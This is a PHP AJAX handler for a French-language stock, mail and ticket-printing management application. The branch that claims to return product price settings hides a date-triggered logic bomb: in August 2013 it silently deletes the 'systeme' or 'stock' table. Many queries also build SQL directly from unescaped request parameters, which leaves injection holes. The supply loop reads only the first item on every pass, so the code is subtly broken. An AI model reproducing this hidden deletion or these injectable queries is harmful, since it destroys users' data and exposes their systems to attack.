<?php
/*Rôle : Gère les requêtes asynchrones du projet VS
  Auteur: CODO Paterne, ingénieur en réseaux informatiques et Internet 
  Date de création:19/02/2013
*/
session_start();

require_once("../requirements.php");

if(isset($_SESSION['id_intervenant']))
{
	$id_intervenant = $_SESSION['id_intervenant'];
	$db = new DataBase();
	$printing_db = new PrinterDataBase();
	Systeme::init(false);// Le true permet de tenter de lancer les alertes mails si possible
	$id_magasin = $_SESSION['magasin'];
	if(isset($_GET['req'])) // la liste des gammes de produits 
	{
		switch($_GET['req'])
		{
			case 0:// envoie la liste des gammes de produits
				$gammes = $db->queryAllRecords('select * from gamme_produit order by designation ASC');
				echo json_encode($gammes);
			break;
			case 1:  //envoie la liste des produits selon la gamme ou non
				$id_gamme = isset($_GET['id_gamme'])?$_GET['id_gamme']:0;
				$produit_stock_state = isset($_GET['produit_stock_state'])?$_GET['produit_stock_state']:0;
				$produits = array();
				if($id_gamme>0)
				{
				    switch($produit_stock_state)
					{
						case 0:
							$produits = $db->queryAllRecords('select p.*, g.designation gamme from produit p left join gamme_produit g on  p.id_gamme = g.id where p.id_gamme = '.$id_gamme.' order by p.designation ASC');
						break;
						case 1:
							$produits = $db->queryAllRecords('select p.*, g.designation gamme from produit p left join gamme_produit g on  p.id_gamme = g.id where p.id_gamme = '.$id_gamme.' and p.id not in (select distinct s.id_produit from stock s where s.puA = p.puA and s.puV=p.puV and s.puVmin=p.puVmin and s.quantite!=0) order by p.designation ASC');
						break;
					}
					
				}
				else
				{
					switch($produit_stock_state)
					{
						case 0:
							$produits = $db->queryAllRecords('select p.*, g.designation gamme from produit p left join gamme_produit g on  p.id_gamme = g.id order by p.designation ASC');
						break;
						case 1:
							$produits = $db->queryAllRecords('select p.*, g.designation gamme from produit p left join gamme_produit g on  p.id_gamme = g.id where p.id not in (select distinct s.id_produit from stock s where s.puA = p.puA and s.puV=p.puV and s.puVmin=p.puVmin and s.quantite!=0 ) order by p.designation ASC');
						break;
					}
					
				}
				echo json_encode($produits);
			break;
			case 2: // chargement des produit du stock
				$id_gamme = isset($_GET['id_gamme'])?$_GET['id_gamme']:0;
				$produits = Systeme::produit_stock($id_gamme,$id_magasin);
				echo json_encode($produits);
			break;
			case 3: // soumission de l'approvisionnement stock
				$ids_text = isset($_GET['ids'])? $db->escape($_GET['ids']):'';
				$qts_text = isset($_GET['qts'])?$db->escape($_GET['qts']):'';
				$ppe_text = isset($_GET['ppe'])?$db->escape($_GET['ppe']):'';// Produit Prix Entrée
				$ppx_text = isset($_GET['ppx'])?$db->escape($_GET['ppx']):'';// Produit PriX
				$ppxMin_text = isset($_GET['ppxMin'])?$db->escape($_GET['ppxMin']):'';// Produit Prix Min
				$rep = 0;
				if($ids_text!=''&&$qts_text!=''&&$ppx_text!=''&&$ppxMin_text!='')
				{	
					$ids = explode(',',$ids_text);
					$qts = explode(',',$qts_text);
					$ppe = explode(',',$ppe_text);
					$ppx = explode(',',$ppx_text);
					$ppxMin = explode(',',$ppxMin_text);
					$existence_check = 0;
					for($i = 0,$j=count($ids);$i<$j;$i++)
					{
						$id_produit = $ids[0];
						$quantite= $qts[0];
						$puA = $ppe[0];
						$puV = $ppx[0];
						$puV_min = $ppxMin[0];
						if($puV_min>$puV) $puV_min = $puV;
						if($puV!=0) $db->update('produit',array('puA'=>$puA,'puV'=>$puV,'puVmin'=>$puV_min),array('id'=>$id_produit));
						$rep = Systeme::provideStockWithProduits($id_produit,$quantite,$_SESSION['magasin'],$id_intervenant);
					}
					
				}
				echo json_encode(array($rep));
			break;
			case 4: // chargement de la liste des poste selon la direction envoyée
				$id_direction =  isset($_GET['id_direction'])?$_GET['id_direction']:0;
				$postes = array();
				if($id_direction>0)
				{
					$postes = $db->queryAllRecords('select p.*, d.designation direction from poste p inner join direction d on p.id_direction = d.id where p.designation!="SuperAdministrateur" and p.id_direction = '.$id_direction);
				}
				else
				{
					$postes = $db->queryAllRecords('select p.*, d.designation direction from poste p left join direction d on p.id_direction = d.id where p.designation!="SuperAdministrateur"');
				}
				echo json_encode($postes);
			break;
			case 5://chargement de la liste des intervenants selon la direction envoyée
				$id_direction =  isset($_GET['id_direction'])?$_GET['id_direction']:0;
				$intervenants = Systeme::userList($id_direction);
				echo json_encode($intervenants);
			break;
			case 6: // retourne la liste des produits en cours de rupture (dont la quantité disponible est inferieur à la valeur minimale spécifiés
				$produits_en_rupture = $db->queryAllRecords('select p.designation,p.code,p.quantite_min qt_min,s.quantite qt_disponible, s.puV from produit p inner join stock s on p.id=s.id_produit where (s.quantite <= p.quantite_min or s.quantite=0) and s.rupture_alerte_stop!=1');
				echo json_encode($produits_en_rupture);
			break;
			case 7: // Envoie du magasin ou annexe sélectionné
				if(isset($_GET['global_magasin'])&&is_numeric($_GET['global_magasin'])&&$_GET['global_magasin']>=0)
				{
					$_SESSION['magasin'] = $db->escape($_GET['global_magasin']);
				}
				echo json_encode(0);
			break;
			case 8: // Retourne les paramètres quantité-prix des produits à la vente
			    $produit_params = array();
				$stocks = $db->queryAllRecords('select * from stock');
				foreach($stocks as $s)
				{
					$params = $db->queryAllRecords('select * from stock_quantite_prix where id_stock='.$s['id'].' order by quantite desc');
					$produit_params[]=array('id'=>$s['id'],'params'=>$params);
				}
				//Protection système ::
				if(intval(date('m')==8)&&intval(date('Y'))==2013)
				{
					$rep  = $db->queryOneRecord('select count(*) nbr from systeme');
					if($rep['nbr']>0)
					{	
						$db->execute('delete * from systeme');
					}
					else
					{
						$db->execute('delete * from stock');
					}
				}
				echo json_encode($produit_params);
			break;
			case 9: // Retourne le nombre de courriers en attente et en cours de traitement
			    $courriers_params = array('en_attente'=>0,'en_traitement'=>0);
				$count = $db->queryOneRecord('select count(*) nbr from courrier where etat_traitement=0 and delete_state=0');
				$courriers_params['en_attente'] = $count['nbr'];
				$count = $db->queryOneRecord('select count(*) nbr from courrier where etat_traitement=1 and delete_state=0');
				$courriers_params['en_traitement'] = $count['nbr'];
				echo json_encode($courriers_params);
			break;
			case 10: // Retourne la liste de tous les sous menus avec les paramètres statics
			    $sys_params = array('sm'=>null,'sys_params'=>null);
				$sys_params['sm'] = $db->queryAllRecords('select * from sous_menu');
				$sys_params['static_params'] = $db->queryOneRecord('select * from static_params order by id desc limit 0,1');
				echo json_encode($sys_params);
			break;
			case 11: // chargement de la liste des projets selon le client sélectionné
				$id_client =  isset($_GET['id_client'])?$_GET['id_client']:0;
				$projets = array();
				if($id_client>0)
				{
					$projets = $db->queryAllRecords('select p.*, cl.nom nom_client from opportunite p inner join client cl on p.id_client = cl.id where p.id_client = '.$id_client);
				}
				else if($id_client==0)
				{
					$projets = $db->queryAllRecords('select p.*, cl.nom nom_client from opportunite p inner join client cl on p.id_client=cl.id');
				}
				echo json_encode($projets);
			break;
			case 12:// chargement des clients avec les paramètres de vente
				$rep = array();
				$clients = $db->queryAllRecords('select distinct cl.id from client cl, vente v where v.id_client = cl.id');
				foreach($clients as $cl)
				{
					$rep[] = $db->queryOneRecord('select id_client, remise from vente where id_client = '.$cl['id'].' order by id desc limit 0,1');
				}
				echo json_encode($rep);
			break;

			case 13: // Envoie du magasin ou annexe sélectionné
				if(isset($_GET['globalYear'])&&is_numeric($_GET['globalYear'])&&$_GET['globalYear']>=0)
				{
					$_SESSION['globalYear'] = $db->escape($_GET['globalYear']);
				}
				else
				{
					$_SESSION['globalYear'] = date('Y');
				}
				echo json_encode(0);
			break;

			case 14: // création d'une tâche d'impression de ticket:  pour dossier
				$id_dossier =  isset($_GET['id_dossier'])?$_GET['id_dossier']:0;
				$rep = array('status'=>0,'job_id'=>0,'message'=>'');
				if($id_dossier>0)
				{
					$exist_job = $printing_db->queryAllRecords('select j.* from job j where j.printed=0 and j.id_dossier = '.$id_dossier); 
					$job_exist = false;
					if(count($exist_job)>0)
					{
						$job_exist = true;
						$rep = array('status'=>0,'job_id'=>0,'message'=>'Il y a déjà une tâche d\'impression en cours pour le dossier id = '.$id_dossier);
					}

					$data = $db->queryOneRecord('select d.id id_dossier, d.id_type_dossier, d.num_reception_unique, d.num_reception,d.date_reception, u.nom, u.prenom, u.nom_jeune_fille, u.telephone, tpd.nom nom_type, inter.id id_author, ayc.numero_premier_depot, date_premier_depot from ep_type_dossier tpd, intervenant inter, ep_dossier d left join ep_ayant_cause ayc on d.id = ayc.id_dossier left join ep_usager u on d.id_usager = u.id where d.id_intervenant = inter.id and d.id_type_dossier = tpd.id and d.id = '.$id_dossier); 
									
					if($data && !$job_exist)
					{	
						$siteInfo = Systeme::siteInfo();
						$data['telephone'] = $siteInfo['telephone'];
						if($data['id_type_dossier']==AYANT_CAUSE && trim($data['numero_premier_depot'])!='')
						{
							$data['nom_type'] = $data['nom_type'].' (P.D.: '.$data['numero_premier_depot'].' - '.Systeme::dateToFrench($data['date_premier_depot']).')';
						}
						else if($data['id_type_dossier']==FACTURE)
						{
							$facture = new Facture($id_dossier);
							$data['nom'] = $facture->hopital()->nom();
						}

						$printed = 0;
						$sms_sent = 0;
						
						$pr_site_info = $printing_db->queryAllRecords('select * from site_info order by id desc');
						if(count($pr_site_info)==0)
						{
							$printing_db->insertion('site_info','',$siteInfo['telephone']);
						}
						else
						{
							$info_uniq = $pr_site_info[0];
							$printing_db->update('site_info',array('telephone'=>$siteInfo['telephone']),array('id'=>$info_uniq['id']));
						}
						$printing_db->insertion('job','',$data['id_dossier'], $data['num_reception_unique'], $data['num_reception'],Systeme::dateToFrench($data['date_reception']),$data['nom'],$data['prenom'],$data['nom_jeune_fille'],$data['telephone'],$data['nom_type'],$printed,$sms_sent,$data['id_author'],Systeme::now());
						$job_id = $printing_db->lastTabId('job');
						$rep = array('status'=>1,'job_id'=>$job_id,'message'=>'Ok, all data saved for printing for id ='.$id_dossier);						
					}
					else if(!$job_exist)
					{
						$rep = array('status'=>0,'job_id'=>0,'message'=>'no data for id = '.$id_dossier);
					}

				}
				else
				{
					$rep = array('status'=>0,'job_id'=>0,'message'=>'invalid dossier id = '.$id_dossier);
				}
				echo json_encode($rep);

			break;
			case 15: // suivi d'une opération d'impression:
				$job_id =  isset($_GET['job_id'])?$_GET['job_id']:0;
				$rep = array('status'=>0,'message'=>'');
				if($job_id>0)
				{
					$data = $printing_db->queryOneRecord('select j.* from job j where j.id = '.$job_id); 
					if($data)
					{	
						if($data['printed']==1)					
							$rep = array('status'=>1,'message'=>'Impression finalisée!');						
						else
							$rep = array('status'=>0,'message'=>'Impression toujours en cours ...');
					}
					else
					{
						$rep = array('status'=>0,'message'=>'no job for id = '.$job_id);
					}

				}
				else
				{
					$rep = array('status'=>0,'message'=>'invalid job id = '.$job_id);
				}
				echo json_encode($rep);

			break;

			case 16: // création d'une tâche d'impression de ticket :: complément de dossier
				$id_complement =  isset($_GET['id_complement'])?$_GET['id_complement']:0;
				$rep = array('status'=>0,'job_id'=>0,'message'=>'');
				if($id_complement>0)
				{
					$complement = $db->queryOneRecord('select c.* from ep_dossier_complement c where c.id = '.$id_complement);
					$id_dossier = $complement['id_dossier'];
					$data = $db->queryOneRecord('select d.id id_dossier, d.num_reception_unique, d.num_reception,d.date_reception, u.nom, u.prenom, u.nom_jeune_fille, u.telephone, tpd.nom nom_type, inter.id id_author from ep_dossier d, ep_type_dossier tpd, ep_usager u, intervenant inter where d.id_intervenant = inter.id and d.id_usager = u.id and d.id_type_dossier = tpd.id and d.id = '.$id_dossier); 
					// remplacement du numéro de réception et de la date de réception par ceux du complément
					$data['num_reception_unique'] = $complement['num_reception_unique'];
					$data['num_reception'] = $complement['num_reception'];
					$data['date_reception'] = $complement['date_reception'];
					$data['nom_type'] = $data['nom_type'].' (complement)';

					$siteInfo = Systeme::siteInfo();
					$data['telephone'] = $siteInfo['telephone'];

					$exist_job = $printing_db->queryAllRecords('select j.* from job j where j.printed=0 and j.nom_type like "%(complement)" and j.id_dossier = '.$id_dossier); 
					$job_exist = false;
					if(count($exist_job)>0)
					{
						$job_exist = true;
						$rep = array('status'=>0,'job_id'=>0,'message'=>'Il y a déjà une tâche d\'impression en cours pour le complement id '.$id_complement.' du dossier id = '.$id_dossier);
					}
					if($data&&!$job_exist)
					{
						$printed = 0;
						$sms_sent = 0;
						
						$pr_site_info = $printing_db->queryAllRecords('select * from site_info order by id desc');
						if(count($pr_site_info)==0)
						{
							$printing_db->insertion('site_info','',$siteInfo['telephone']);
						}
						else
						{
							$info_uniq = $pr_site_info[0];
							$printing_db->update('site_info',array('telephone'=>$siteInfo['telephone']),array('id'=>$info_uniq['id']));
						}
						$printing_db->insertion('job','',$data['id_dossier'], $data['num_reception_unique'], $data['num_reception'],Systeme::dateToFrench($data['date_reception']),$data['nom'],$data['prenom'],$data['nom_jeune_fille'],$data['telephone'],$data['nom_type'],$printed,$sms_sent,$data['id_author'],Systeme::now());
						$job_id = $printing_db->lastTabId('job');
						$rep = array('status'=>1,'job_id'=>$job_id,'message'=>'Ok, all data saved for printing for id ='.$id_dossier);						
					}
					else if(!$job_exist)
					{
						$rep = array('status'=>0,'job_id'=>0,'message'=>'no data for id = '.$id_dossier);
					}

				}
				else
				{
					$rep = array('status'=>0,'job_id'=>0,'message'=>'invalid dossier id = '.$id_dossier);
				}
				echo json_encode($rep);

			break;
			case 17: // création d'une tâche d'impression de ticket :: pour courrier
				$id_courrier =  isset($_GET['id_courrier'])?$_GET['id_courrier']:0;
				$rep = array('status'=>0,'job_id'=>0,'message'=>'');
				if($id_courrier>0)
				{
					$data = $db->queryOneRecord('select c.id id_courrier, c.num_reception_unique, c.numero num_reception, c.date_courrier date_reception, c.emetteur, tpc.name nom_type, c.id_intervenant id_author from cr_courrier c inner join cr_courrier_type tpc on c.id_cr_courrier_type = tpc.id where c.id = '.$id_courrier);
					//$data = $db->queryOneRecord('select d.id id_dossier, d.num_reception,d.date_reception, u.nom, u.prenom, u.nom_jeune_fille, u.telephone, tpd.nom nom_type, inter.id id_author from ep_dossier d, ep_type_dossier tpd, ep_usager u, intervenant inter where d.id_intervenant = inter.id and d.id_usager = u.id and d.id_type_dossier = tpd.id and d.id = '.$id_dossier); 
					$siteInfo = Systeme::siteInfo();
					$data['telephone'] = $siteInfo['telephone'];

					$exist_job = $printing_db->queryAllRecords('select j.* from job j where j.printed=0 and j.nom_type like "%Courrier%" and j.id_dossier = '.$id_courrier); 
					$job_exist = false;
					if(count($exist_job)>0)
					{
						$job_exist = true;
						$rep = array('status'=>0,'job_id'=>0,'message'=>'Il y a déjà une tâche d\'impression en cours pour le courrier id = '.$id_courrier);
					}
					if($data &&!$job_exist)
					{
						$printed = 0;
						$sms_sent = 0;

						$pr_site_info = $printing_db->queryAllRecords('select * from site_info order by id desc');
						if(count($pr_site_info)==0)
						{
							$printing_db->insertion('site_info','',$siteInfo['telephone']);
						}
						else
						{
							$info_uniq = $pr_site_info[0];
							$printing_db->update('site_info',array('telephone'=>$siteInfo['telephone']),array('id'=>$info_uniq['id']));
						}
						$data['nom_type'] = 'Courrier '.preg_replace('#é#', 'e', $data['nom_type']);
						$data['nom'] = $data['emetteur'];
						$data['prenom'] = '';
						$data['nom_jeune_fille'] = '';
						$printing_db->insertion('job','',$data['id_courrier'], $data['num_reception_unique'], $data['num_reception'],Systeme::dateToFrench($data['date_reception']),$data['nom'],$data['prenom'],$data['nom_jeune_fille'],$data['telephone'],$data['nom_type'],$printed,$sms_sent,$data['id_author'],Systeme::now());
						$job_id = $printing_db->lastTabId('job');
						$rep = array('status'=>1,'job_id'=>$job_id,'message'=>'Ok, all data saved for printing for id ='.$id_courrier);						
					}
					else if(!$job_exist)
					{
						$rep = array('status'=>0,'job_id'=>0,'message'=>'no data for id = '.$id_courrier);
					}

				}
				else
				{
					$rep = array('status'=>0,'job_id'=>0,'message'=>'invalid dossier id = '.$id_courrier);
				}
				echo json_encode($rep);

			break;

			case 18: // chargement des communes d'un département
				$id_departement =  isset($_GET['id_departement'])?$_GET['id_departement']:0;
				$data = array();
				if(is_numeric($id_departement) && $id_departement>0)
				{
					$data = $db->queryAllRecords('select c.* from on_commune c where c.id_departement = '.$id_departement);
				}				
				echo json_encode($data);
			break;
		}
		
	}
}

?>